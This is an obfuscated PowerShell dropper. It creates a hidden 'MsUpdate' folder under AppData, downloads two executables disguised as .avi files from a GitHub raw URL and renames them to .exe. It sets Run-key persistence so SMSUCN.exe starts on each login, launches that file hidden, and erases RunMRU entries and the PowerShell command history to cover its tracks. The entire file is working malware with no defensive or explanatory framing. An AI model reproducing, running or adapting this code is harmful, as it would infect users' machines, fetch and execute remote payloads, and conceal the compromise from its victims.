  SV  bom  (  [TyPE]("{0}{1}{5}{4}{2}{3}" -f'SYstE','M.e','e','NT','onm','NVIr'));   sV ("rwL"+"dp") (  [typE]("{1}{5}{4}{2}{0}{3}" -f 'trIbu','SYS','IleAt','tes','IO.f','tEm.') )  ;
${eR`ROR`A`cTIonp`ReF`EReN`ce} = ("{4}{3}{2}{0}{1}"-f 'inu','e','ntlyCont','ile','S')
${uSeR`ProFi`le} =   $BOM::("{2}{1}{0}"-f 'derPath','tFol','Ge').Invoke(("{0}{1}{2}" -f'UserPro','fil','e'))
${mS`RDpNE`Tpath} = &("{1}{0}{2}" -f 'in-P','Jo','ath') ${Us`ER`ProfILe} ((("{0}{2}{4}{3}{6}{7}{5}{1}"-f 'A','ate','ppDa','l','tabh3Loca','ftbh3MsUpd','bh','3Microso')).("{0}{1}"-f 're','PLacE').Invoke('bh3','\'))
if (-not (&("{2}{1}{0}"-f '-Path','est','T') -Path ${m`sRd`PN`etpATH})) {
    ${Msr`DP`N`etFol`Der} = .("{2}{0}{1}"-f 'w-Ite','m','Ne') -Path ${mS`R`DpN`ETP`ATH} -ItemType ("{2}{1}{0}" -f'y','rector','Di') -Force
    ${MSrDpnEt`Fo`ldeR}."a`TtR`IBUtEs" += ("{1}{0}"-f'den','Hid')
}


${r`UT`AlO`CalAgenT} = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\RegUpdate.exe"
${urlremOTO`Ag`E`NT} = ("{8}{4}{6}{2}{10}{0}{5}{7}{3}{1}{11}{12}{9}"-f'.c','fs/','gith','ie/UCN/raw/re','tps','om/ema','://','ked','ht','in/RegUpdate.avi','ub','he','ads/ma')
if (-not (&("{0}{1}{2}"-f'Test','-Pa','th') ${RUTaLo`C`AL`AG`enT})) {
    &("{3}{0}{2}{1}" -f 'n','Request','voke-Web','I') -Uri ${uR`lr`eMoT`OAGENt} -OutFile ${RU`T`ALoCaLa`GeNt}
}
if ((&("{2}{0}{1}"-f'It','em','Get-') ${rutAlOCAl`A`GENT})."N`AMe" -ne ("{0}{1}{2}" -f 'RegUpdate','.e','xe')) {
    ${ruta`NuEvO`N`OMb`ReAgEnt} = ${ru`TalOC`ALaG`Ent} -replace ("{0}{3}{1}{2}" -f'RegUpdat','v','i','e.a'), ("{0}{2}{3}{1}"-f 'RegUpd','exe','at','e.')
    .("{1}{0}{2}"-f 'en','R','ame-Item') -Path ${rU`Ta`l`OcalAgE`Nt} -NewName ${RUTANUEv`on`OMb`Reag`ENt}
}
${aTR`Ib`Ut`O`soC`U`lTOSAgenT} = (.("{2}{1}{0}" -f'-Item','t','Ge') ${RuT`A`LO`CaL`AgEnt})."Att`R`iB`UTes" -bor   $rwLdp::"HI`DdEN"
.("{2}{4}{3}{1}{0}"-f 'y','t','Se','r','t-ItemPrope') -Path ${RUta`lo`cA`lA`gEnt} -Name ("{2}{0}{1}"-f 'i','butes','Attr') -Value ${At`RIbu`TOso`CuLT`oSaGenT}
.("{2}{0}{3}{1}" -f'bl','ck-File','Un','o') -Path ${rUT`AlOCa`l`AGe`NT}

















${RUtal`OC`ALeJEcUT`Er} = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
${url`RE`m`OtOEjecuter} = ("{0}{5}{8}{12}{6}{1}{10}{3}{7}{9}{11}{4}{2}"-f'http','/UCN','UCN.avi','/r','n/SMS','s://githu','emakedie','ef','b.c','s/hea','/raw','ds/mai','om/')
if (-not (.("{0}{2}{1}" -f 'Tes','Path','t-') ${ruTaloc`A`LEjEc`UteR})) {
    .("{3}{4}{0}{2}{1}" -f 'WebR','quest','e','In','voke-') -Uri ${u`RLr`EmO`ToEj`EC`UteR} -OutFile ${R`UtA`LOCALE`jE`CUt`eR}
}
if ((.("{1}{0}" -f'Item','Get-') ${rUT`ALOc`Al`eJeCuter})."N`AMe" -ne ("{3}{2}{1}{0}"-f 'exe','N.','UC','SMS')) {
    ${Rut`AN`U`Ev`onOMBrEEjecUteR} = ${Ru`TAL`o`C`AleJecU`TeR} -replace ("{0}{2}{1}"-f 'SMSU','N.avi','C'), ("{0}{2}{1}" -f'SMS','e','UCN.ex')
    .("{2}{1}{0}" -f 'm','e-Ite','Renam') -Path ${rUTaL`oC`ALeJEc`Uter} -NewName ${rutanUeV`O`NoMBR`E`ejEcUtEr}
}
${at`R`Ibut`osoCu`lToS`eJe`CUt`er} = (&("{2}{0}{1}" -f'Ite','m','Get-') ${rUtalo`C`Al`EJECu`TEr})."a`T`TRiBUTES" -bor   (  dir  ("VA"+"riaBl"+"e:RwLDP")  )."v`AlUe"::"H`ID`dEN"
&("{0}{2}{1}" -f'Set-ItemP','y','ropert') -Path ${RU`T`AlocAL`EJECUTER} -Name ("{1}{2}{0}"-f 'utes','A','ttrib') -Value ${ATrIBUTOs`OCU`Lt`oSEJe`cUTeR}
&("{1}{0}{2}"-f'-','Unblock','File') -Path ${R`Ut`Aloc`ALe`JeCUTer}



${ru`Ta`REgIS`TrO} = ((("{9}{4}{6}{5}{1}{11}{7}{0}{10}{8}{2}{3}"-f'dECurrentV','rePdEMicrosof','u','n','U:PdESo','a','ftw','WindowsP','onPdER','HKC','ersi','tPdE')) -cRePlace'PdE',[cHAr]92)
${No`M`BR`Ee`NTradA} = ("{0}{1}{2}"-f'MsUpd','at','e')
if (-not (&("{1}{0}{2}" -f'st-P','Te','ath') "$rutaRegistro\$nombreEntrada")) {
    ${VAlOreNT`R`AdA} = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
    ${NU`LL} = .("{0}{2}{1}{3}" -f'New','mPr','-Ite','operty') -Path ${R`UTAregiS`TRo} -Name ${no`MbrEeNT`RAda} -Value ${VALoRE`N`T`RaDA} -PropertyType ("{2}{1}{0}"-f'g','in','Str') -Force
}



${reG`is`TRyPA`Th} = ((("{3}{10}{21}{1}{11}{4}{7}{18}{12}{15}{2}{14}{16}{13}{17}{9}{6}{5}{19}{0}{20}{8}" -f 'plorerAU2R','rosof','2Cu','HKCU:AU','AU2','o','i','Wi','RU','ers','2So','t','owsA','t','rr','U','en','V','nd','nAU2Ex','unM','ftwareAU2Mic'))."Re`PLA`Ce"(([CHAr]65+[CHAr]85+[CHAr]50),'\'))
&("{2}{0}{1}" -f 'emove-Ite','m','R') -LiteralPath ${r`EGIstRy`P`Ath} -Force



.("{0}{1}{2}{3}"-f'Start-','P','roces','s') -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -ArgumentList ("{1}{0}" -f 'tart','s') -WindowStyle ("{0}{1}" -f 'Hidd','en')



&("{1}{0}{3}{2}"-f 'o','Clear-Hist','y','r')
&("{2}{0}{1}" -f 'e-','Item','Remov') (("{11}{2}{20}{21}{4}{17}{3}{6}{18}{12}{22}{24}{14}{10}{26}{1}{16}{19}{8}{28}{0}{9}{13}{25}{5}{23}{15}{7}{27}" -f 'li','s9dPower','eZen','FI','RP','eHost_h','LE','ory.','dPSR','n','i','S','ings9dMicr','es9d','dW','t','She','RO','s9dAppDatas9dRoam','lls9','v:','USE','osof','is','ts9','Consol','ndows','txt','ead')).("{1}{2}{0}"-f 'Ce','R','EPLa').Invoke('s9d','\').("{0}{1}" -f'REP','LaCe').Invoke('SeZ','$')
exit
